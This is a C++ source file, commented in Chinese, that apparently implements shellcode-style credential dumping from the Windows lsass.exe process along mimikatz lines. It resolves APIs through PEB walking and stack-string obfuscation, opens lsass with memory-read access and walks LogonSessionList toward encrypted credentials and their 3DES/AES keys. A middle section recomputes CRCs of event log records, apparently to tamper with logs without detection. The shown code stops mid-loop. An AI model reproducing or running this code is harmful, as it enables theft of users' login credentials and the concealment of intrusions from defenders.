#include <Windows.h>
#include <winternl.h>
#include <stdio.h>

// #define DEBUG




typedef
FARPROC
(NTAPI* PNT_GetProcAddress)(
    HMODULE hModule,
    LPCSTR  lpProcName
    );

typedef
HMODULE
(NTAPI* PNT_LoadLibraryA)(
    LPCSTR lpLibFileName
    );
typedef
DWORD 
(NTAPI* PNT_RtlComputeCrc32)(
    DWORD       dwInitial,
    CONST BYTE* pData,
    INT         iLen
        );//
typedef
HANDLE
(NTAPI* PNT_CreateFileA)(
    LPCSTR                lpFileName,
    DWORD                 dwDesiredAccess,
    DWORD                 dwShareMode,
    LPSECURITY_ATTRIBUTES lpSecurityAttributes,
    DWORD                 dwCreationDisposition,
    DWORD                 dwFlagsAndAttributes,
    HANDLE                hTemplateFile
    );

typedef
HFILE
(NTAPI* PNT_OpenFile)(
    LPCSTR     lpFileName,
    LPOFSTRUCT lpReOpenBuff,
    UINT       uStyle
    );

typedef
BOOL
(NTAPI* PNT_ReadFile)(
    HANDLE       hFile,
    LPVOID       lpBuffer,
    DWORD        nNumberOfBytesToRead,
    LPDWORD      lpNumberOfBytesRead,
    LPOVERLAPPED lpOverlapped
    );

typedef
HANDLE
(NTAPI* PNT_OpenProcess)(
    DWORD dwDesiredAccess,
    BOOL  bInheritHandle,
    DWORD dwProcessId
    );

typedef
BOOL
(NTAPI* PNT_EnumProcessModules)(
    HANDLE  hProcess,
    HMODULE* lphModule,
    DWORD   cb,
    LPDWORD lpcbNeeded
    );

typedef
DWORD
(NTAPI* PNT_GetModuleFileNameExA)(
    HANDLE  hProcess,
    HMODULE hModule,
    LPSTR   lpFilename,
    DWORD   nSize
    );

typedef
BOOL
(NTAPI* PNT_ReadProcessMemory)(
    HANDLE  hProcess,
    LPCVOID lpBaseAddress,
    LPVOID  lpBuffer,
    SIZE_T  nSize,
    SIZE_T* lpNumberOfBytesRead
    );

typedef
BOOL
(NTAPI* PNT_WriteFile)(
    HANDLE       hFile,
    LPCVOID      lpBuffer,
    DWORD        nNumberOfBytesToWrite,
    LPDWORD      lpNumberOfBytesWritten,
    LPOVERLAPPED lpOverlapped
    );

typedef
BOOL
(NTAPI* PNT_CloseHandle)(
    HANDLE       hObject
    );


#define TABLE_LENGTH 1024
#define TO_LOWERCASE(out, c1) (out = (c1 <= 'Z' && c1 >= 'A') ? c1 = (c1 - 'A') + 'a': c1)

inline LPVOID get_func_by_name(LPVOID module, char* func_name)
{
    IMAGE_DOS_HEADER* idh = (IMAGE_DOS_HEADER*)module;
    if (idh->e_magic != IMAGE_DOS_SIGNATURE) {
        return nullptr;
    }
    IMAGE_NT_HEADERS* nt_headers = (IMAGE_NT_HEADERS*)((BYTE*)module + idh->e_lfanew);
    IMAGE_DATA_DIRECTORY* exportsDir = &(nt_headers->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT]);
    if (!exportsDir->VirtualAddress) {
        return nullptr;
    }

    DWORD expAddr = exportsDir->VirtualAddress;
    IMAGE_EXPORT_DIRECTORY* exp = (IMAGE_EXPORT_DIRECTORY*)(expAddr + (ULONG_PTR)module);
    SIZE_T namesCount = exp->NumberOfNames;

    DWORD funcsListRVA = exp->AddressOfFunctions;
    DWORD funcNamesListRVA = exp->AddressOfNames;
    DWORD namesOrdsListRVA = exp->AddressOfNameOrdinals;

    //go through names:
    for (SIZE_T i = 0; i < namesCount; i++) {
        DWORD* nameRVA = (DWORD*)(funcNamesListRVA + (BYTE*)module + i * sizeof(DWORD));
        WORD* nameIndex = (WORD*)(namesOrdsListRVA + (BYTE*)module + i * sizeof(WORD));
        DWORD* funcRVA = (DWORD*)(funcsListRVA + (BYTE*)module + (*nameIndex) * sizeof(DWORD));

        LPSTR curr_name = (LPSTR)(*nameRVA + (BYTE*)module);
        size_t k;
        for (k = 0; func_name[k] != 0 && curr_name[k] != 0; k++) {
            if (func_name[k] != curr_name[k]) break;
        }
        if (func_name[k] == 0 && curr_name[k] == 0) {
            //found
            return (BYTE*)module + (*funcRVA);
        }
    }
    return nullptr;
}


inline bool _compare_ntdll_name(WORD len, WCHAR* dll_name) {
    // 我们只需要定位kernel32，直接作为char处理即可
    // wchar的话，对于英文字符串，就是一个char一个0，结束符为两个0
    // len/2就是实际长度（不包括\0）,kernel32.dll长度就是12
    char DTwew[] = { 'n','t','d','l','l','.','d','l','l',0 };
    if (len / 2 != 9)return false;
    for (int i = 0; i < len / 2; i++) {
        char c;
        TO_LOWERCASE(c, dll_name[i]);
        if (c != DTwew[i])return false;
    }
    return true;
}
inline bool _compare_kernel32_name(WORD len, WCHAR* dll_name) {
    // 我们只需要定位kernel32，直接作为char处理即可
    // wchar的话，对于英文字符串，就是一个char一个0，结束符为两个0
    // len/2就是实际长度（不包括\0）,kernel32.dll长度就是12
    char DTwew[] = { 'k','e','r','n','e','l','3','2','.','d','l','l',0 };
    if (len / 2 != 12)return false;
    for (int i = 0; i < len / 2; i++) {
        char c;
        TO_LOWERCASE(c, dll_name[i]);
        if (c != DTwew[i])return false;
    }
    return true;
}


inline bool _compare_psapi_name(WORD len, WCHAR* dll_name) {
    // 我们只需要定位kernel32，直接作为char处理即可
    // wchar的话，对于英文字符串，就是一个char一个0，结束符为两个0
    // len/2就是实际长度（不包括\0）,kernel32.dll长度就是12
    char DTwew[] = { 'p','s','a','p','i','.','d','l','l',0 };
    if (len / 2 != 9)return false;
    for (int i = 0; i < len / 2; i++) {
        char c;
        TO_LOWERCASE(c, dll_name[i]);
        if (c != DTwew[i])return false;
    }
    return true;
}


inline bool _compare_lsass_name(char* dll_name) {
    // char oyctO[] = { 'l','s','a','s','s','.','e','x','e',0 }; 
    char oyctO[] = { 'i','m','m','3','2','.','d','l','l',0 };
    for (int i = 0; (dll_name[i] != 0) && (i < 9); i++) {
        char c;
        TO_LOWERCASE(c, dll_name[i]);
        if (c != oyctO[i])return false;
    }
    return true;
}

inline DWORD64 _return_hex_value(char _hex_char) {
    if (_hex_char == '0') {
        return 0;
    }
    if (_hex_char == '1') {
        return 1;
    }
    if (_hex_char == '2') {
        return 2;
    }
    if (_hex_char == '3') {
        return 3;
    }
    if (_hex_char == '4') {
        return 4;
    }
    if (_hex_char == '5') {
        return 5;
    }
    if (_hex_char == '6') {
        return 6;
    }
    if (_hex_char == '7') {
        return 7;
    }
    if (_hex_char == '8') {
        return 8;
    }
    if (_hex_char == '9') {
        return 9;
    }
    if (_hex_char == 'a') {
        return 10;
    }
    if (_hex_char == 'b') {
        return 11;
    }
    if (_hex_char == 'c') {
        return 12;
    }
    if (_hex_char == 'd') {
        return 13;
    }
    if (_hex_char == 'e') {
        return 14;
    }
    if (_hex_char == 'f') {
        return 15;
    }

}

inline bool _compare_lsasrv_name(char* dll_name) {
    // char zGlRm[] = { 'l','s','a','s','r','v','.','d','l','l',0 }; 
    char zGlRm[] = { 'k','e','r','n','e','l','3','2','.','d','l','l',0 };
    // for (int i = 0; (dll_name[i] != 0) && (i < 10); i++) {
    for (int i = 0; (dll_name[i] != 0) && (i < 12); i++) {
        char c;
        TO_LOWERCASE(c, dll_name[i]);
        if (c != zGlRm[i])return false;
    }
    return true;
    //TO_LOWERCASE
}


int main() {
    // 随着对mimikatz代码理解的深入，我现在对logonsessionlist的了解也更多了
    // logonsessionlist并不是一个单纯的链表头，而是包含了多个链表的一个数组
    /*
0: kd> !list lsasrv!LogonSessionList
00007ffa`5f0fc6e0  00000009`28f02210 00000009`2952a980
00007ffa`5f0fc6f0  00000009`298ec530 00000009`28f034c0
00007ffa`5f0fc700  00000009`297e6040 00000009`28ef6c40
00007ffa`5f0fc710  00000009`29551fe0 00000009`28ef1e50
00007ffa`5f0fc720  00000000`00000000 00000000`00000000
00007ffa`5f0fc730  00000000`00000000 00000000`00000000
00007ffa`5f0fc740  00000000`00000000 00000000`00000000
00007ffa`5f0fc750  00000000`00000000 00000000`00000000
    */
    // 如上图所示这里面一共有四个链表，链表头地址分别为 00007ffa`5f0fc6e0 / 00007ffa`5f0fc6f0 / 00007ffa`5f0fc700 / 00007ffa`5f0fc710
    // 我们需要从LogonSessionList开始遍历，每次往后偏移0x10，取出QWORD，为0则中止

    DWORD _offset_table[TABLE_LENGTH][4] = {
        {0x32BC3,0x39E5C,0x9E36E,0x108},
        {0x1FA63,0x395DC,0x8CA6C,0x108}
    };


    // 读取gs寄存器的值获取到当前进程的peb
    DWORD64 _peb = __readgsqword(0x60);
    // 往后偏移0x18得到&ldr
    DWORD64 _p_ldr = _peb + 0x18;
    // 取出ldr的地址
    DWORD64 _ldr = *(reinterpret_cast<DWORD64*>(_p_ldr));
    // 往后偏移0x10得到&InLoadOrderModuleList
    DWORD64 _p_InLoadOrderModuleList = _ldr + 0x10;
    // 取出InLoadOrderModuleList地址
    DWORD64 _InLoadOrderModuleList = *(reinterpret_cast<DWORD64*>(_p_InLoadOrderModuleList));
    // 这个地址是_LDR_DATA_TABLE_ENTRY的第一个字段的地址，也就是_LDR_DATA_TABLE_ENTRY的地址
    // 记录下这个地址，然后开始遍历，直到flink=记录下来的地址
    // 遍历module
    // 实际测试发现这个链表有一个头结点，头结点中不保存实际数据，除了flink和blink，其余字段都是空的
    // 我们要在遍历过程中对dll名称进行对比，由于我们要编写shellcode，所以不能使用任何库函数，只能自己实现

    DWORD64 _entry_addr = _InLoadOrderModuleList;
    DWORD64 _kernel32_base_addr = 0;
    DWORD64 _ntdll_base_addr = 0;
    DWORD64 _psapi_base_addr = 0;
    while (1) {
        // 获取dll名称，0x58
        DWORD64 _dll_name = _entry_addr + 0x58;
        UNICODE_STRING* dll_name = reinterpret_cast<UNICODE_STRING*>(_dll_name);
        //wprintf(L"dll name: %s\n", dll_name->Buffer);
        // 获取dllbase地址，0x30
        DWORD64 _p_dll_base = _entry_addr + 0x30;
        DWORD64 _dll_base = *(reinterpret_cast<DWORD64*>(_p_dll_base));

#ifdef DEBUG

        if (0 == reinterpret_cast<DWORD64*>(_dll_base)) {
            MessageBoxA(NULL, "OK", "OK", MB_OK);
        }
        printf("base address: %p\n", reinterpret_cast<DWORD64*>(_dll_base));
#endif // DEBUG

        if ((dll_name->Length != 0) && (_compare_kernel32_name(dll_name->Length, dll_name->Buffer))) {
            _kernel32_base_addr = _dll_base;
        }
        if ((dll_name->Length != 0) && (_compare_ntdll_name(dll_name->Length, dll_name->Buffer))) {
            _ntdll_base_addr = _dll_base;
        }
        if ((dll_name->Length != 0) && (_compare_psapi_name(dll_name->Length, dll_name->Buffer))) {
            _psapi_base_addr = _dll_base;
        }
        // 获取flink
        _entry_addr = *(reinterpret_cast<DWORD64*>(_entry_addr));
        if (_InLoadOrderModuleList == _entry_addr) break;

    }
    //if (_kernel32_base_addr) {
    //    printf("kernel32.dll located, base address: %p\n", reinterpret_cast<DWORD64*>(_kernel32_base_addr));
    //}

    // 获取到kernel32的基地址之后需要获取其导出表，来定位我们需要用到的api
    // 我们需要解析kernel32.dll的PE结构
    // 这里我直接用了网上现成的代码
    // 把kernel32的基地址传上去，把想要获取的函数名称传上去即可
    char stack_string[50] = { 0 };
    stack_string[0] = 'L'; stack_string[1] = 'o'; stack_string[2] = 'a'; stack_string[3] = 'd'; stack_string[4] = 'L'; stack_string[5] = 'i'; stack_string[6] = 'b'; stack_string[7] = 'r'; stack_string[8] = 'a'; stack_string[9] = 'r'; stack_string[10] = 'y'; stack_string[11] = 'A';
    VOID* _LoadLibraryA_addr = get_func_by_name(reinterpret_cast<LPVOID>(_kernel32_base_addr), stack_string);
    SecureZeroMemory(stack_string, 50);
    stack_string[0] = 'G'; stack_string[1] = 'e'; stack_string[2] = 't'; stack_string[3] = 'P'; stack_string[4] = 'r'; stack_string[5] = 'o'; stack_string[6] = 'c'; stack_string[7] = 'A'; stack_string[8] = 'd'; stack_string[9] = 'd'; stack_string[10] = 'r'; stack_string[11] = 'e'; stack_string[12] = 's'; stack_string[13] = 's';
    VOID* _GetProcAddress_addr = get_func_by_name(reinterpret_cast<LPVOID>(_kernel32_base_addr), stack_string);

    char asd[123] = "RtlComputeCrc32";
    PNT_RtlComputeCrc32 NT_RtlComputeCrc32 =(PNT_RtlComputeCrc32)get_func_by_name(reinterpret_cast<LPVOID>(_ntdll_base_addr), asd);
    HANDLE _file_handle = CreateFileA("C:\\Users\\LC\\Documents\\未命名7",
        GENERIC_ALL,
        0,
        NULL,
        OPEN_EXISTING,
        FILE_ATTRIBUTE_NORMAL,
        NULL);
    DWORD dwNewPos = SetFilePointer(_file_handle, 0x1000, NULL, FILE_BEGIN);

    BYTE* buffer = (BYTE*)malloc(0x200);
    ZeroMemory(buffer, 0x200);
    DWORD out = 0;
    ReadFile(_file_handle,
        buffer,
        0x200,
        &out,
        NULL
    );
    // 获取到0x30偏移的dword
    DWORD _free_space_offset = *(reinterpret_cast<DWORD*>(buffer+0x30));
   // 计算出所有record的长度
    DWORD record_length = _free_space_offset - 0x200;

    // 将指针定位到0x1200即可读到第一个record
     dwNewPos = SetFilePointer(_file_handle, 0x1200, NULL, FILE_BEGIN);
    free(buffer);
    BYTE* _record_buffer = (BYTE*)malloc(record_length);
    ZeroMemory(_record_buffer, record_length);
     out = 0;
    ReadFile(_file_handle,
        _record_buffer,
        record_length,
        &out,
        NULL
    );

    DWORD r8d = NT_RtlComputeCrc32(0, _record_buffer, record_length);

    
    DWORD _final_res = r8d;
    printf("%08x\n\n", _final_res);
    printf("record crc: \n");
    printf("%02x", _final_res << 24 >> 24);
    printf("%02x", _final_res << 16 >> 24);
    printf("%02x", _final_res << 8 >> 24);
    printf("%02x\n", _final_res >> 24);
    CloseHandle(_file_handle);
    system("pause");
    // 在更新完record的crc之后，因为这个crc在elfchunk头的crc计算范围内，所以我们要重新计算elfchunk的crc
    _file_handle=  CreateFileA("C:\\Users\\LC\\Documents\\未命名7",
        GENERIC_ALL,
        0,
        NULL,
        OPEN_EXISTING,
        FILE_ATTRIBUTE_NORMAL,
        NULL);
     dwNewPos = SetFilePointer(_file_handle, 0x1000, NULL, FILE_BEGIN);

    BYTE* buffer123123 = (BYTE*)malloc(0x200);
    ZeroMemory(buffer, 0x200);
     out = 0;
    ReadFile(_file_handle,
        buffer123123,
        0x200,
        &out,
        NULL
    );

     r8d = NT_RtlComputeCrc32(0, buffer123123, 0x78);
    r8d = NT_RtlComputeCrc32(r8d, buffer123123 + 0x80, 0x200 - 0x80);


     _final_res = r8d;
    printf("%08x\n\n", _final_res);

    printf("new elfchunk crc: \n");
    printf("%02x", _final_res << 24 >> 24);
    printf("%02x", _final_res << 16 >> 24);
    printf("%02x", _final_res << 8 >> 24);
    printf("%02x\n", _final_res >> 24);
    exit(-1);

    PNT_LoadLibraryA NT_LoadLibraryA = (PNT_LoadLibraryA)_LoadLibraryA_addr;
    PNT_GetProcAddress NT_GetProcAddress = (PNT_GetProcAddress)_GetProcAddress_addr;

    // 从文件中读取数组索引值，获取相关符号的偏移量

    // 首先要从kernel32中获取CreateFileA/ReadFile
    SecureZeroMemory(stack_string, 50);
    stack_string[0] = 'C'; stack_string[1] = 'r'; stack_string[2] = 'e'; stack_string[3] = 'a'; stack_string[4] = 't'; stack_string[5] = 'e'; stack_string[6] = 'F'; stack_string[7] = 'i'; stack_string[8] = 'l'; stack_string[9] = 'e'; stack_string[10] = 'A';
    PNT_CreateFileA NT_CreateFileA = (PNT_CreateFileA)NT_GetProcAddress((HMODULE)_kernel32_base_addr, stack_string);
    SecureZeroMemory(stack_string, 50);
    stack_string[0] = 'R'; stack_string[1] = 'e'; stack_string[2] = 'a'; stack_string[3] = 'd'; stack_string[4] = 'F'; stack_string[5] = 'i'; stack_string[6] = 'l'; stack_string[7] = 'e';
    PNT_ReadFile NT_ReadFile = (PNT_ReadFile)NT_GetProcAddress((HMODULE)_kernel32_base_addr, stack_string);


    SecureZeroMemory(stack_string, 50);
    stack_string[0] = 'C'; stack_string[1] = 'l'; stack_string[2] = 'o'; stack_string[3] = 's'; stack_string[4] = 'e'; stack_string[5] = 'H'; stack_string[6] = 'a'; stack_string[7] = 'n'; stack_string[8] = 'd'; stack_string[9] = 'l'; stack_string[10] = 'e';
    PNT_CloseHandle NT_CloseHandle = (PNT_CloseHandle)NT_GetProcAddress((HMODULE)_kernel32_base_addr, stack_string);

    // 获取文件句柄
    SecureZeroMemory(stack_string, 50);
    stack_string[0] = 'C'; stack_string[1] = ':'; stack_string[2] = '\\'; stack_string[3] = 'u'; stack_string[4] = 's'; stack_string[5] = 'e'; stack_string[6] = 'r'; stack_string[7] = 's'; stack_string[8] = '\\'; stack_string[9] = 'p'; stack_string[10] = 'u'; stack_string[11] = 'b'; stack_string[12] = 'l'; stack_string[13] = 'i'; stack_string[14] = 'c'; stack_string[15] = '\\'; stack_string[16] = 'i'; stack_string[17] = 'l'; stack_string[18] = 'i'; stack_string[19] = '6'; stack_string[20] = 'a'; stack_string[21] = 'o';
    HANDLE hFile = NT_CreateFileA(stack_string,               // file to open
        GENERIC_READ,          // open for reading
        FILE_SHARE_READ,       // share for reading
        NULL,                  // default security
        OPEN_EXISTING,         // existing file only
        FILE_ATTRIBUTE_NORMAL, // normal file
        NULL);
    if (INVALID_HANDLE_VALUE == hFile)  return 0;
    // 读取文件
    SecureZeroMemory(stack_string, 50);
     out = 0;
    if (NT_ReadFile(hFile,
        stack_string,
        50,
        &out,
        NULL
    ) == FALSE)
        return 0;

    // 关闭文件句柄
    NT_CloseHandle(hFile);


    // 当前情况下，我们的table长度不超过100，就算以后也大概率不会超过1000，所以
    // 我按照3位数进行处理
    // 现在这种写法，我们需要经常回来修改shellcode代码，用起来很麻烦，因为需要修改里面硬编码的数组
    // shellcode的制作很蛋疼，所以我决定把偏移量直接写在文件里我们在这边读取即可
    DWORD _index = (stack_string[0] - '0') * 100 + (stack_string[1] - '0') * 10 + (stack_string[2] - '0');


    // 剩下的7位，是lsass.exe进程的PID
    DWORD _lsass_pid = (stack_string[3] - '0') * 1000000 + (stack_string[4] - '0') * 100000 +
        (stack_string[5] - '0') * 10000 + (stack_string[6] - '0') * 1000 +
        (stack_string[7] - '0') * 100 + (stack_string[8] - '0') * 10 +
        (stack_string[9] - '0');



    // 计算各offset
    DWORD64 _logon_session_list_offset =
        _return_hex_value(stack_string[10]) << 28;
    _logon_session_list_offset +=
        _return_hex_value(stack_string[11]) << 24;
    _logon_session_list_offset +=
        _return_hex_value(stack_string[12]) << 20;
    _logon_session_list_offset +=
        _return_hex_value(stack_string[13]) << 16;
    _logon_session_list_offset +=
        _return_hex_value(stack_string[14]) << 12;
    _logon_session_list_offset +=
        _return_hex_value(stack_string[15]) << 8;
    _logon_session_list_offset +=
        _return_hex_value(stack_string[16]) << 4;
    _logon_session_list_offset +=
        _return_hex_value(stack_string[17]);


    DWORD64 _3des_key_offset =
        _return_hex_value(stack_string[8 + 10]) << 28;
    _3des_key_offset +=
        _return_hex_value(stack_string[8 + 11]) << 24;
    _3des_key_offset +=
        _return_hex_value(stack_string[8 + 12]) << 20;
    _3des_key_offset +=
        _return_hex_value(stack_string[8 + 13]) << 16;
    _3des_key_offset +=
        _return_hex_value(stack_string[8 + 14]) << 12;
    _3des_key_offset +=
        _return_hex_value(stack_string[8 + 15]) << 8;
    _3des_key_offset +=
        _return_hex_value(stack_string[8 + 16]) << 4;
    _3des_key_offset +=
        _return_hex_value(stack_string[8 + 17]);


    DWORD64 _aes_key_offset =
        _return_hex_value(stack_string[8 + 8 + 10]) << 28;
    _aes_key_offset +=
        _return_hex_value(stack_string[8 + 8 + 11]) << 24;
    _aes_key_offset +=
        _return_hex_value(stack_string[8 + 8 + 12]) << 20;
    _aes_key_offset +=
        _return_hex_value(stack_string[8 + 8 + 13]) << 16;
    _aes_key_offset +=
        _return_hex_value(stack_string[8 + 8 + 14]) << 12;
    _aes_key_offset +=
        _return_hex_value(stack_string[8 + 8 + 15]) << 8;
    _aes_key_offset +=
        _return_hex_value(stack_string[8 + 8 + 16]) << 4;
    _aes_key_offset +=
        _return_hex_value(stack_string[8 + 8 + 17]);


    DWORD64 _credential_offset =
        _return_hex_value(stack_string[8 + 8 + 8 + 10]) << 28;
    _credential_offset +=
        _return_hex_value(stack_string[8 + 8 + 8 + 11]) << 24;
    _credential_offset +=
        _return_hex_value(stack_string[8 + 8 + 8 + 12]) << 20;
    _credential_offset +=
        _return_hex_value(stack_string[8 + 8 + 8 + 13]) << 16;
    _credential_offset +=
        _return_hex_value(stack_string[8 + 8 + 8 + 14]) << 12;
    _credential_offset +=
        _return_hex_value(stack_string[8 + 8 + 8 + 15]) << 8;
    _credential_offset +=
        _return_hex_value(stack_string[8 + 8 + 8 + 16]) << 4;
    _credential_offset +=
        _return_hex_value(stack_string[8 + 8 + 8 + 17]);

    // 长度的偏移很小，2byte足够了
    WORD _3des_aes_len_offset =
        _return_hex_value(stack_string[8 + 8 + 8 + 8 + 10]) << 4;
    _3des_aes_len_offset +=
        _return_hex_value(stack_string[8 + 8 + 8 + 8 + 11]);

    // DWORD _3des_key_offset = _offset_table[_index][1];
    // DWORD _aes_key_offset = _offset_table[_index][2];
    // DWORD _credential_offset = _offset_table[_index][3];


    // printf("%d\t%d\t%d\n", _logon_session_list_offset, _3des_key_offset, _aes_key_offset);

    // 下面我们需要获取lsass.exe进程的句柄
    // DCOM服务进程默认打开SeDebugPrivilege
    SecureZeroMemory(stack_string, 50);
    stack_string[0] = 'O'; stack_string[1] = 'p'; stack_string[2] = 'e'; stack_string[3] = 'n'; stack_string[4] = 'P'; stack_string[5] = 'r'; stack_string[6] = 'o'; stack_string[7] = 'c'; stack_string[8] = 'e'; stack_string[9] = 's'; stack_string[10] = 's';
    PNT_OpenProcess NT_OpenProcess = (PNT_OpenProcess)NT_GetProcAddress((HMODULE)_kernel32_base_addr, stack_string);
    HANDLE _lsass_handle = NT_OpenProcess(PROCESS_QUERY_INFORMATION | PROCESS_VM_READ, FALSE, _lsass_pid);

    if (INVALID_HANDLE_VALUE == _lsass_handle)  return 0;

    HMODULE lsassDll[1024];
    DWORD bytesReturned;
    char modName[50] = { 0 };
    char* lsass = NULL, * lsasrv = NULL;

    // EnumProcessModules和GetModuleFileNameExA需要从psapi.dll中获取
    HMODULE _psapi_module;
    if (!_psapi_base_addr) {
        SecureZeroMemory(stack_string, 50);
        stack_string[0] = 'p'; stack_string[1] = 's'; stack_string[2] = 'a'; stack_string[3] = 'p'; stack_string[4] = 'i'; stack_string[5] = '.'; stack_string[6] = 'd'; stack_string[7] = 'l'; stack_string[8] = 'l';
        _psapi_module = NT_LoadLibraryA(stack_string);
    }
    else
        _psapi_module = (HMODULE)_psapi_base_addr;

    SecureZeroMemory(stack_string, 50);
    stack_string[0] = 'E'; stack_string[1] = 'n'; stack_string[2] = 'u'; stack_string[3] = 'm'; stack_string[4] = 'P'; stack_string[5] = 'r'; stack_string[6] = 'o'; stack_string[7] = 'c'; stack_string[8] = 'e'; stack_string[9] = 's'; stack_string[10] = 's'; stack_string[11] = 'M'; stack_string[12] = 'o'; stack_string[13] = 'd'; stack_string[14] = 'u'; stack_string[15] = 'l'; stack_string[16] = 'e'; stack_string[17] = 's';
    PNT_EnumProcessModules NT_EnumProcessModules = (PNT_EnumProcessModules)NT_GetProcAddress(_psapi_module, stack_string);

    SecureZeroMemory(stack_string, 50);
    stack_string[0] = 'G'; stack_string[1] = 'e'; stack_string[2] = 't'; stack_string[3] = 'M'; stack_string[4] = 'o'; stack_string[5] = 'd'; stack_string[6] = 'u'; stack_string[7] = 'l'; stack_string[8] = 'e'; stack_string[9] = 'F'; stack_string[10] = 'i'; stack_string[11] = 'l'; stack_string[12] = 'e'; stack_string[13] = 'N'; stack_string[14] = 'a'; stack_string[15] = 'm'; stack_string[16] = 'e'; stack_string[17] = 'E'; stack_string[18] = 'x'; stack_string[19] = 'A';
    PNT_GetModuleFileNameExA NT_GetModuleFileNameExA = (PNT_GetModuleFileNameExA)NT_GetProcAddress(_psapi_module, stack_string);

    SecureZeroMemory(stack_string, 50);
    stack_string[0] = 'W'; stack_string[1] = 'r'; stack_string[2] = 'i'; stack_string[3] = 't'; stack_string[4] = 'e'; stack_string[5] = 'F'; stack_string[6] = 'i'; stack_string[7] = 'l'; stack_string[8] = 'e';
    PNT_WriteFile NT_WriteFile = (PNT_WriteFile)NT_GetProcAddress((HMODULE)_kernel32_base_addr, stack_string);

    if (NT_EnumProcessModules(_lsass_handle, lsassDll, sizeof(lsassDll), &bytesReturned)) {

        // For each DLL address, get its name so we can find what we are looking for
        for (int i = 0; i < bytesReturned / sizeof(HMODULE); i++) {
            NT_GetModuleFileNameExA(_lsass_handle, lsassDll[i], modName, sizeof(modName));

            // 需要先遍历(char*)lsassDll[i]来获取模块字符串的长度，因为他里面保存的是绝对路径
            // 因此需要倒序进行比较
            int j = 0;
            for (;; j++) {
                if (modName[j] == '\0') break;
            }
            //循环完成后，j就是字符串的实际长度
            BOOL flag = 1;
            SecureZeroMemory(stack_string, 50);
            stack_string[0] = 'l'; stack_string[1] = 's'; stack_string[2] = 'a'; stack_string[3] = 's'; stack_string[4] = 's'; stack_string[5] = '.'; stack_string[6] = 'e'; stack_string[7] = 'x'; stack_string[8] = 'e';
            for (int k = 0; k < 9; k++) {
                if (stack_string[8 - k] != modName[j - 1 - k]) {
                    flag = 0;
                    break;
                }
            }
            if (flag) {
                lsass = (char*)lsassDll[i];
                continue;
            }

            flag = 1;
            SecureZeroMemory(stack_string, 50);
            stack_string[0] = 'l'; stack_string[1] = 's'; stack_string[2] = 'a'; stack_string[3] = 's'; stack_string[4] = 'r'; stack_string[5] = 'v'; stack_string[6] = '.'; stack_string[7] = 'd'; stack_string[8] = 'l'; stack_string[9] = 'l';
            for (int k = 0; k < 10; k++) {
                if (stack_string[9 - k] != modName[j - 1 - k]) {
                    flag = 0;
                    break;
                }
            }
            if (flag) {
                lsasrv = (char*)lsassDll[i];
                continue;
            }
        }
    }

    if ((!lsass) || (!lsasrv)) {
        // 有任意一个模块的地址获取失败，就不用往下进行了
        return 0;
    }

    // 现在可以根据偏移量去读取lsass进程内存了

    // 定位logonsessionList
    // 用lsasrv+_logon_session_list_offset+7可得到下一条指令的地址
    // lsasrv+_logon_session_list_offset+3可以得到相对偏移量的地址DWORD

    SecureZeroMemory(stack_string, 50);
    stack_string[0] = 'R'; stack_string[1] = 'e'; stack_string[2] = 'a'; stack_string[3] = 'd'; stack_string[4] = 'P'; stack_string[5] = 'r'; stack_string[6] = 'o'; stack_string[7] = 'c'; stack_string[8] = 'e'; stack_string[9] = 's'; stack_string[10] = 's'; stack_string[11] = 'M'; stack_string[12] = 'e'; stack_string[13] = 'm'; stack_string[14] = 'o'; stack_string[15] = 'r'; stack_string[16] = 'y';
    PNT_ReadProcessMemory NT_ReadProcessMemory = (PNT_ReadProcessMemory)NT_GetProcAddress((HMODULE)_kernel32_base_addr, stack_string);
    SIZE_T bytesRead = 0;
    SecureZeroMemory(stack_string, 50);
#ifdef DEBUG
    printf("%p\n", (void*)(lsasrv + _logon_session_list_offset + 3));
    printf("handle %x\n", _lsass_handle);
    MessageBoxA(NULL, "OK33333333333", "OK333", MB_OK);
#endif // DEBUG
    NT_ReadProcessMemory(_lsass_handle, (void*)(lsasrv + _logon_session_list_offset + 3), (void*)stack_string, 4, &bytesRead);
    // 反转字节得到偏移量

#ifdef DEBUG
    printf("%p\n", (void*)(lsasrv + _logon_session_list_offset + 3));
    MessageBoxA(NULL, "OK33333333333", "OK333", MB_OK);
#endif // DEBUG
    DWORD _offset_rip = *(DWORD*)stack_string | (*(DWORD*)(stack_string + 1) << 8) | (*(DWORD*)(stack_string + 2) << 16) | (*(DWORD*)(stack_string + 3) << 24);
    char* _logon_session_list_addr = lsasrv + _logon_session_list_offset + 7 + _offset_rip;
#ifdef DEBUG
    printf("_logon_session_list_addr %p\n", _logon_session_list_addr);
    MessageBoxA(NULL, "OK33333333333", "OK333", MB_OK);
#endif // DEBUG
    DWORD64 _DWORD64_logon_session_list_ARRAY_addr = reinterpret_cast<DWORD64>(_logon_session_list_addr);
#ifdef DEBUG
    printf("_DWORD64_logon_session_list_ARRAY_addr %x\n", _DWORD64_logon_session_list_ARRAY_addr);
    MessageBoxA(NULL, "OK33333333333", "OK333", MB_OK);
#endif // DEBUG
    while (1) {
        char* _link_header = _logon_session_list_addr;
#ifdef DEBUG

        printf("_link_header address: %p\n", _link_header);
#endif // DEBUG
        while (1) {
            // 遍历logonsessionlist
            // 取出前8字节，获取到下一个节点的地址，因为第一个是头结点，里面并没有有意义的数据，因此我们在循环体开头就取地址
            SecureZeroMemory(stack_string, 50);
            bytesRead = 0;
            NT_ReadProcessMemory(_lsass_handle, (void*)_logon_session_list_addr, (void*)stack_string, 8, &bytesRead);
            DWORD64 _next_node_addr = *(reinterpret_cast<DWORD64*>(stack_string));
#ifdef DEBUG

            printf("_next_node_addr address: %p\n", _link_header);
#endif // DEBUG
            // 除了判断收尾相接之外，我们还要判断是否为空链表
            if (0 == _next_node_addr || _link_header == reinterpret_cast<char*>(_next_node_addr)) {
                break;
            }
            _logon_session_list_addr = reinterpret_cast<char*>(_next_node_addr);

#ifdef DEBUG
            printf("\n\n\n\n_logon_session_list_addr node addr: %p\n", _logon_session_list_addr);
#endif // DEBUG


            // 现在我们已经拿到了logonsessionlist的地址，下面需要获得密文的地址
            // 密文的偏移量和操作系统版本有关，具体请参考mimikatz源码
            // C:\Users\123\Downloads\mimikatz-main\mimikatz-master (1)\mimikatz\modules\sekurlsa\kuhl_m_sekurlsa.c#L300
            // 对于win10及以上版本，使用0x108即可
            // 后面想了想，决定把这个偏移量也放在由main程序传过来的文件中
            char* _p_credential_addr = _logon_session_list_addr + _credential_offset;
            // 这个地址中保存了credential的地址，因此我们需要取出其中的内容
            // 读取lsass进程内存
            SecureZeroMemory(stack_string, 50);
            bytesRead = 0;

